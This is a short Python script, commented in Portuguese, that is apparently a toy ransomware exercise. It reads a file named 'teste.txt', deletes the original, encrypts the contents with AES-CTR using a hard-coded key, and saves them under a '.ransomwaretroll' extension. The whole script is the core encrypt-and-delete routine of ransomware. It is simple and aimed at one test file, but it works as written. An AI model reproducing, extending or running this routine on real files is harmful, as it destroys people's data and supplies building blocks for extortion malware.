import os
import pyaes

## ABRIR ARQUIVO A SER CRIPTOGRAFADO

file_name = 'teste.txt'
file = open(file_name, 'rb')
file_data = file.read()
file.close()

## REMOVER ARQUIVO ORIGINAL

os.remove(file_name)

##  CHAVE DE ENCRIPTACAO

key = b'testeransomwares'
aes = pyaes.AESModeOfOperationCTR(key)

## CRIPTOGRAFAR ARQUIVO

crypto_data = aes.encrypt(file_data)

## SALVAR ARQUIVO

new_file = file_name + ".ransomwaretroll"
new_file = open(f'{new_file}', 'wb')
new_file.write(crypto_data)
new_file.close()

